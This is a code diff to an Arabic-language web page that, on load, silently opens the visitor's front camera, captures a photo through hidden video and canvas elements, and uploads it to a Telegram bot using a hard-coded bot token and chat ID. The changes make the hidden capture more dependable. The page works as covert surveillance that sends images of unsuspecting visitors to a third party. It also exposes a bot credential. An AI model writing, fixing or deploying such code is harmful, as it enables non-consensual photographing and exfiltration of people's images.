@@ -2,51 +2,52 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>التقاط صورة وإرسالها إلى تلجرام تلقائيًا</title>
+  <title>التقاط صورة تلقائية وإرسالها إلى تلجرام</title>
 </head>
 <body>
-  <video id="video" playsinline autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
   <script>
-    // متغيرات البوت
-    const botToken = "7718357126:AAGl8aCypqjXlRNsVqgBZ-cMVqBdRI25k-8";
+    const botToken = "70718054647964608918:AAFDyakp3Vc_ZPNbUifkhS2pwCp9fbHQsKs";
     const chatId = "7071805464";
 
-    // فتح الكاميرا الأمامية
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(function(stream) {
-        const video = document.getElementById('video');
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
         video.srcObject = stream;
+        video.play();
 
-        // بمجرد تشغيل الفيديو، التقط الصورة بعد ثانية واحدة
-        video.onloadedmetadata = function() {
-          setTimeout(() => {
-            captureAndSend();
-            // أوقف الكاميرا بعد الالتقاط
-            stream.getTracks().forEach(track => track.stop());
-          }, 1000); // انتظر ثانية واحدة
-        };
+        // استخدم حدث canplay بدلاً من onloadedmetadata
+        video.addEventListener('canplay', function() {
+          // تحقق من أن الفيديو جاهز والأبعاد غير صفر
+          if (video.videoWidth > 0 && video.videoHeight > 0) {
+            setTimeout(() => {
+              captureAndSend(video, stream);
+            }, 500); // انتظر نصف ثانية إضافية إن أردت الدقة
+          }
+        });
       })
       .catch(function(error) {
         alert("حدث خطأ في فتح الكاميرا: " + error);
       });
 
-    function captureAndSend() {
-      const video = document.getElementById('video');
+    function captureAndSend(video, stream) {
+      if (video.videoWidth === 0 || video.videoHeight === 0) {
+        alert("تعذر التقاط الصورة: الكاميرا لم تجهز بعد.");
+        return;
+      }
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      // تحويل الصورة إلى Blob
       canvas.toBlob(function(blob) {
-        // تجهيز البيانات للإرسال لتليجرام
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'photo.jpg');
 
-        // إرسال الصورة إلى بوت تلجرام
         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: 'POST',
           body: formData
@@ -58,6 +59,9 @@
         .catch(error => {
           alert("خطأ في إرسال الصورة: " + error);
         });
+
+        // أوقف الكاميرا بعد الالتقاط
+        stream.getTracks().forEach(track => track.stop());
       }, 'image/jpeg');
     }
   </script>
